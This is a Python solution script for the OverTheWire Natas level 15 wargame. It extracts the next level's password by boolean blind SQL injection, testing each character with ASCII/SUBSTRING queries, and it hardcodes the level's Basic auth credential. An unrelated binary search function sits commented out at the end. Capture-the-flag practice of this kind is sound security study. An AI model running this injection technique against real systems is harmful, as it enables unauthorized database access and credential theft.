#!/bin/python3

import requests
import string
import sys

all_characters = string.printable
data=""

print("Your key for natas 16 is: ", end = '')
sys.stdout.flush()
for i in range(1,33):
    for eachchar in range(0,len(all_characters)):
        asciichar = ord(all_characters[eachchar])
        session = requests.session()

        burp0_url_staging = 'test1" or ASCII(SUBSTRING((SELECT password from users where username="natas16"),%s,1))=%s;-- -' % (i,asciichar)
        burp0_url = 'http://natas15.natas.labs.overthewire.org:80/?username=' + requests.utils.quote(burp0_url_staging) + '&debug=test'
        #print(burp0_url)
        burp0_headers = {"Cache-Control": "max-age=0", "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,ja;q=0.8", "Connection": "close"}
        response = session.get(burp0_url, headers=burp0_headers)
        #print(len(response.content))
        #print(response.text)
        if "This user exists" in response.text:
            hello = all_characters[eachchar]
            print(hello, end = '')
            sys.stdout.flush()
            data+=all_characters[eachchar]     
            break


print("")
print(data)

"""
def binarySearch(nums, target):

    low = 0
    high = len(nums) - 1
    middle = 0
  
    while low <= high:  
        middle = (high + low) // 2  
        
        # target equals nums[middle], return middle (index of target)
        if target == nums[middle]: 
            return middle

        # Take the upper half 
        elif target > nums[middle]: 
            low = middle + 1
  
        # Take the lower half
        else: 
            high = middle - 1
  
    # If we reach this line, target is not present in nums
    return -1
"""
